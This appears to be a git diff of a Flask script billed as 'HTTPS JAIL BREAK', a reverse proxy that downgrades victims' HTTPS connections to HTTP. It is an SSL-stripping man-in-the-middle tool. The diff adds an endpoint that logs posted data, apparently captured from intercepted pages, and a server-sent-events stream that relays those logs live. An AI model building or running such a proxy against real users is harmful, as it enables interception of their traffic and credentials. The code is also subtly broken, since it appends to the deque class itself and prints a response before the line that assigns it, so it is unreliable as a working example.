@@ -1,16 +1,18 @@
 #⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️
 # written by Idan.M 
 # reverse proxy for downgrading the connection from https to http
-
-
-
-from flask import Flask, request,make_response,render_template,send_from_directory
+from flask import Flask, request,make_response,render_template,send_from_directory,Response
 import requests
 import proxy_utils 
 import logging
 import re
+import time
 import os 
 import proxy_parser 
+from collections import deque
+
+sseStack = deque()
+
 app = Flask(__name__,static_url_path='', 
             static_folder='static',
             template_folder='templates')
@@ -22,10 +24,12 @@ logger.setLevel(logging.WARN)
 VALID_IP = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
 logedUsers = {} 
 
+
+
 @app.route("/",methods = ["GET"])
 def wellcome(): 
-     if request.host.removeprefix("http://").startswith("vvvvvv"): 
-        return proxy("/")
+     if not re.match(VALID_IP,request.host.removeprefix("http://")): 
+        return proxy("")
      return render_template('home_page.html' ) 
        
 @app.route("/plots",methods = ["GET"])
@@ -60,9 +64,20 @@ def cybugsServe(path):
     
 @app.route("/log_api/<path:path>" , methods = ['POST'])  
 def log(path):  
-     logger.log(level = logging.WARNING ,msg= request.data)
+     logger.log(level = logging.WARNING ,msg= f"log : {request.data} {path} " )
+     deque.append(f"log : {request.data} {path} " )
+     print("loging...")
      return "<p>logged</p>",200
-                         
+        
+@app.route("/sse/log_api" , methods = ['GET'])  
+def logSSE():  
+    def generateSSE() :
+         while(True): 
+              if sseStack:  
+                    yield sseStack.popleft() 
+              time.sleep(1)
+    return Response(generateSSE(), mimetype='text/event-stream')
+                       
 @app.route("/",methods = ["POST"])
 @app.route("/<path:path>", methods=['GET', 'POST'])
 def proxy(path):
@@ -70,8 +85,8 @@ def proxy(path):
      method = request.method #get the method 
      data = request.form.to_dict()   #get the data section for requests 
      parmas = proxy_parser.argsParse(request.args.to_dict(),domainName,path)
-     respone = requests.request(method, domainName+path, data = data  ,params= parmas ,  headers= proxy_utils.cleanHeaders(request.headers,proxy_utils.Way.To))
      print(domainName+path , respone.status_code , respone)
+     respone = requests.request(method, domainName+path, data = data  ,params= parmas ,  headers= proxy_utils.cleanHeaders(request.headers,proxy_utils.Way.To))
      returnData = None
      if "content-type" in respone.headers and "image" in respone.headers["content-type"]: #return an Image 
           # proxy_utils.saveContent(respone.content,path,os.getcwd(),"image")
